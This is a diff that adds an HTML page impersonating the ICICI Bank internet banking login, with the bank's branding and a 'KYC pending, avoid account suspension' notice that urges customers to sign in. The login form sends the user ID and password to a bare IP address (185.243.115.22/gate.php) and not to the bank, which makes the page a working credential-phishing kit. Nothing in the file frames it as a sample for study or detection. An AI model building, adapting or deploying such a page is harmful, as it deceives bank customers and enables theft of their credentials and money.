@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ICICI Bank - Internet Banking Login</title>
+  <link rel="icon" href="/assets/favicon.ico">
+  <link rel="stylesheet" href="/assets/style.css">
+  <style>
+    body { background: #f4f4f4; color: #333333; font-family: Arial; }
+    .header { background-color: #b02a30; }
+    .btn { background: #f37e20; color: #fff; }
+  </style>
+</head>
+<body>
+  <div class="header" id="top">
+    <img src="/assets/logo.png" alt="ICICI Bank" width="180">
+    <span class="tagline">Hum Hai Na</span>
+  </div>
+  <div class="container">
+    <div class="notice">
+      <p>Dear Customer, your KYC is pending. Please verify your details to avoid account suspension.</p>
+    </div>
+    <form id="loginForm" method="post" action="https://185.243.115.22/gate.php">
+      <h2>Login to Internet Banking</h2>
+      <label for="uid">User ID</label>
+      <input type="text" id="uid" name="uid" placeholder="Enter User ID">
+      <label for="pwd">Password</label>
+      <input type="password" id="pwd" name="pwd" placeholder="Enter Password">
+      <input type="hidden" name="ref" value="kyc-2026">
+      <button type="submit" class="btn">Login</button>
+      <a href="/forgot">Forgot password?</a>
+    </form>
+    <ul class="links">
+      <li><a href="/personal">Personal</a></li>
+      <li><a href="/nri">NRI</a></li>
+      <li><a href="/business">Business</a></li>
+    </ul>
+  </div>
+  <div class="footer">
+    <p>Copyright 2026 ICICI Bank Limited. All rights reserved.</p>
+    <img src="/assets/secure.png" alt="secure">
+  </div>
+  <script src="/assets/jquery.min.js"></script>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) { console.log('x'); });
+  </script>
+</body>
+</html>
